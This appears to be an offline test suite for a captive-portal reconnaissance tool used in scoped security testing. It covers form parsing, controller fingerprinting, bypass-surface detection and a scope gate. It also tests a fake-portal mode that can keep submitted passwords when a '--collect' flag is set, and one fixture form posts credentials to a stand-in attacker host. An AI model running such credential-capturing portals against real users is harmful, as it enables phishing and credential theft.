// Offline self-check for the captive-portal recon/analyzer (portal.js). No network: every
// request goes through an injected ctx.fetch, and scope is an explicit in-memory object, so the
// parser, fingerprint, surface analysis and the scope gate are all exercised deterministically.
// Run: node tools/test-portal.js
const assert = require('assert');
const portal = require('./portal');

const SCOPE = { allowed_hosts: ['portal.example.sh'], allowed_ips: [], allowed_url_prefixes: [] };
const SCOPE_GW = { allowed_hosts: ['portal.example.sh', 'gw.example.sh'], allowed_ips: [], allowed_url_prefixes: [] };

// ---- attribute / form parsing ----
assert.deepStrictEqual(
  portal.parseAttrs('action="/login" method="POST" data-x=1 disabled'),
  { action: '/login', method: 'POST', 'data-x': '1' },
  'attrs: quoted + bare values'
);
assert.deepStrictEqual(portal.parseAttrs("name='a b' value=\"c'd\""), { name: 'a b', value: "c'd" }, 'attrs: quote styles');

const FORM_HTML = [
  '<html><head><title>  Guest  Wi-Fi </title></head><body>',
  '<form action="/signin" method="post">',
  '<input type="hidden" name="csrf_token" value="abc123">',
  '<input type="text" name="username">',
  '<input type="password" name="password">',
  '<select name="access_code"><option>1</option></select>',
  '<button name="submit" type="submit">Go</button>',
  '</form>',
  '</body></html>',
].join('\n');
const forms = portal.parseForms(FORM_HTML);
assert.strictEqual(forms.length, 1, 'one form parsed');
assert.strictEqual(forms[0].method, 'post', 'form method lowercased');
assert.deepStrictEqual(forms[0].fields.map((f) => f.name), ['csrf_token', 'username', 'password', 'access_code', 'submit'], 'all named fields captured');
assert.strictEqual(forms[0].fields[0].hidden, true, 'hidden field flagged');
assert.strictEqual(forms[0].fields[2].type, 'password', 'password type preserved');
assert.strictEqual(portal.titleOf(FORM_HTML), 'Guest Wi-Fi', 'title whitespace collapsed');
assert.strictEqual(portal.titleOf('<html></html>'), null, 'missing title -> null');

// ---- controller fingerprint ----
const mikrotik = portal.fingerprint({ url: 'http://gw.example.sh/', headers: { server: 'RouterOS' }, body: '<title>hotspot</title>' });
assert.ok(mikrotik.controllers.some((c) => c.id === 'mikrotik' && c.confidence === 'medium'), 'MikroTik via Server header (medium)');
const unifi = portal.fingerprint({ url: 'https://x/', headers: {}, body: 'welcome to the UniFi guest portal' });
assert.ok(unifi.controllers.some((c) => c.id === 'unifi' && c.confidence === 'low'), 'UniFi via body (low)');
assert.ok(unifi.controllers.some((c) => c.id === 'generic-portal'), 'generic portal marker also matched');
assert.strictEqual(portal.fingerprint({ url: 'https://x/', headers: {}, body: '<p>plain</p>' }).controllers.length, 0, 'plain page = no controller');
assert.strictEqual(portal.fingerprint({ url: 'https://x/', headers: {}, body: '' }).tls, true, 'tls reported from url');

// ---- portal detection ----
assert.strictEqual(portal.portalLikely({ headers: { 'www-authenticate': 'Basic realm="x"' }, body: '' }).likely, true, 'WWW-Authenticate => portal');
assert.ok(portal.portalLikely({ headers: {}, body: FORM_HTML }).reasons.some((r) => /password field/.test(r)), 'password form => portal signal');
assert.strictEqual(portal.portalLikely({ headers: {}, body: '<h1>welcome</h1>' }).likely, false, 'plain page => not a portal');

// ---- parameter classification ----
const params = portal.classifyParams(['redirect_url', 'dst', 'client_mac', 'csrf_token', 'username', 'password', 'access_code', 'room']);
assert.deepStrictEqual(params.redirect.sort(), ['dst', 'redirect_url'], 'redirect params');
assert.deepStrictEqual(params.mac, ['client_mac'], 'mac param');
assert.deepStrictEqual(params.token, ['csrf_token'], 'token param');
assert.deepStrictEqual(params.identity.sort(), ['access_code', 'password', 'room', 'username'], 'identity params');

// ---- bypass surfaces ----
const OPEN_PORTAL = [
  '<html><body><form action="https://evil.example.net/capture" method="post">',
  '<input type="password" name="password">',
  '<input type="hidden" name="client_mac" value="aa:bb:cc:dd:ee:ff">',
  '</form></body></html>',
].join('\n');
const analysis = portal.analyzePage({ url: 'http://portal.example.sh/login?redirect_url=%2Fhome', headers: {}, body: OPEN_PORTAL }, 'http://portal.example.sh/login?redirect_url=%2Fhome');
const kinds = analysis.surfaces.map((s) => s.cwe);
assert.ok(kinds.includes('CWE-601'), 'redirect param surface (open redirect)');
assert.ok(kinds.includes('CWE-639'), 'client MAC surface (authz bypass)');
assert.ok(kinds.includes('CWE-319'), 'cleartext password surface over http');
assert.ok(analysis.surfaces.some((s) => /different host/.test(s.issue)), 'cross-host form action surface');
assert.strictEqual(analysis.forms.length, 1, 'form surfaced');
assert.strictEqual(portal.analyzePage({ url: 'https://portal.example.sh/', headers: {}, body: '<p>nothing</p>' }, 'https://portal.example.sh/').surfaces.length, 0, 'clean page => no surfaces');
assert.strictEqual(portal.topSurface(analysis.surfaces).severity, 'medium', 'top surface = highest non-info');

// ---- --record payload (the record-finding.js candidate the CLI emits) ----
const rec = portal.recordPayload({ ok: true, final_url: 'http://portal.example.sh/login?redirect_url=%2Fhome', surfaces: analysis.surfaces }, 'http://portal.example.sh/');
assert.strictEqual(rec.class, 'redirect', 'record payload uses the top surface class');
assert.strictEqual(rec.cwe, 'CWE-601', 'record payload carries the CWE');
assert.strictEqual(rec.host, 'portal.example.sh', 'record payload host from final_url');
assert.ok(rec.endpoint.includes('/login'), 'record payload endpoint = path+query');
assert.ok(rec.poc.includes('portal.js analyze'), 'record payload poc references the analyzer');
assert.strictEqual(rec.severity, 'Medium', 'record payload severity capitalized for record-finding');
assert.strictEqual(portal.recordPayload({ ok: true, surfaces: [{ severity: 'info', class: 'session', cwe: 'CWE-294', issue: 'x' }] }, 'http://h/'), null, 'info-only surfaces are not recorded');
assert.strictEqual(portal.recordPayload({ ok: false, reason: 'blocked', surfaces: analysis.surfaces }, 'http://h/'), null, 'blocked result is not recorded');

// ---- serve: submission handling (redaction is the default; --collect is a second opt-in) ----
const noCollect = portal.handleSubmission('username=bob&password=s3cret&csrf_token=t', { collect: false });
assert.strictEqual(noCollect.captured, false, 'capture off by default');
assert.strictEqual(noCollect.fields.username, 'bob', 'non-secret field recorded without collect');
assert.strictEqual(noCollect.fields.password, '<redacted>', 'password redacted without --collect');
assert.deepStrictEqual(noCollect.names, ['username', 'password', 'csrf_token'], 'field names always recorded');
const withCollect = portal.handleSubmission('username=bob&password=s3cret', { collect: true });
assert.strictEqual(withCollect.captured, true, 'collect opts in');
assert.strictEqual(withCollect.fields.password, 's3cret', 'value kept only with --collect');
assert.deepStrictEqual(portal.handleSubmission('', {}), { names: [], fields: {}, captured: false }, 'empty body is safe');

// ---- serve: page resolution (custom dir vs built-in default) ----
const fs = require('fs');
const os = require('os');
const path = require('path');
const tmpDir = path.join(os.tmpdir(), 'portal-test-' + process.pid);
fs.mkdirSync(tmpDir, { recursive: true });
fs.writeFileSync(path.join(tmpDir, 'index.html'), '<h1>custom portal</h1>');
assert.strictEqual(portal.portalHtml(tmpDir), '<h1>custom portal</h1>', 'custom index.html served');
assert.strictEqual(portal.portalHtml(path.join(tmpDir, 'missing')), portal.DEFAULT_PORTAL_HTML, 'missing dir -> built-in page');
assert.ok(/name="password"/.test(portal.DEFAULT_PORTAL_HTML), 'built-in page has a password field');
fs.rmSync(tmpDir, { recursive: true, force: true });

// ---- probe: scope gate + redirect chain (injected fetch) ----
const fetchMap = {
  'http://gw.example.sh/': { status: 302, headers: { location: '/login' }, body: '' },
  'http://gw.example.sh/login': { status: 200, headers: { 'content-type': 'text/html' }, body: FORM_HTML },
};
const fakeFetch = async (url) => fetchMap[url] || { status: 404, headers: {}, body: '' };

(async () => {
  // out of scope -> refused before any fetch
  const blocked = await portal.probe('http://evil.example.org/', { scope: SCOPE, fetch: fakeFetch });
  assert.strictEqual(blocked.ok, false, 'out-of-scope probe refused');
  assert.strictEqual(blocked.blocked, true, 'blocked flag set');
  // G1: the refusal is actionable — it points at scope.json allowed_ips (private-gateway case).
  assert.ok(/allowed_ips/.test(blocked.next_step) && /192\.168\./.test(blocked.next_step), 'blocked probe carries an allowed_ips next_step');
  const blockedGw = portal.scopeHint('http://192.168.1.1/');
  assert.ok(/192\.168\.1\.1/.test(blockedGw) && /allowed_ips/.test(blockedGw), 'scopeHint names the gateway and allowed_ips');

  const p = await portal.probe('http://gw.example.sh/', { scope: SCOPE_GW, fetch: fakeFetch });
  assert.strictEqual(p.ok, true, 'in-scope probe ok');
  assert.strictEqual(p.portal_likely, true, 'redirect + password form => portal');
  assert.strictEqual(p.redirect_chain.length, 2, 'followed one redirect hop');
  assert.strictEqual(p.final_url, 'http://gw.example.sh/login', 'final url after redirect');
  assert.strictEqual(p.chain === undefined, true, 'no raw chain key leaked');

  // a hop that leaves scope is refused mid-chain
  const escFetch = async (url) => (url === 'http://gw.example.sh/' ? { status: 302, headers: { location: 'http://evil.example.org/p' }, body: '' } : { status: 200, headers: {}, body: '' });
  const escaped = await portal.probe('http://gw.example.sh/', { scope: SCOPE_GW, fetch: escFetch });
  assert.strictEqual(escaped.ok, false, 'redirect leaving scope refused');
  assert.ok(/out of allowed_hosts|not in allowed_hosts/.test(escaped.reason), 'refusal reason is the scope verdict');

  // --no-follow stops after the first response
  const noFollow = await portal.probe('http://gw.example.sh/', { scope: SCOPE_GW, fetch: fakeFetch, follow: false });
  assert.strictEqual(noFollow.redirect_chain.length, 1, 'no-follow stops at the first hop');
  assert.strictEqual(noFollow.final_url, 'http://gw.example.sh/', 'no-follow final = requested url');

  // analyze reuses the chain and reports surfaces
  const a = await portal.analyze('http://gw.example.sh/', { scope: SCOPE_GW, fetch: fakeFetch });
  assert.strictEqual(a.ok, true, 'in-scope analyze ok');
  assert.strictEqual(a.tls, false, 'http => tls false');
  assert.ok(a.params.mac.length >= 0, 'params bucket present');
  const aBlocked = await portal.analyze('http://evil.example.org/', { scope: SCOPE, fetch: fakeFetch });
  assert.strictEqual(aBlocked.ok, false, 'out-of-scope analyze refused');

  console.log('portal: all tests passed');
})().catch((e) => { console.error(e); process.exit(1); });
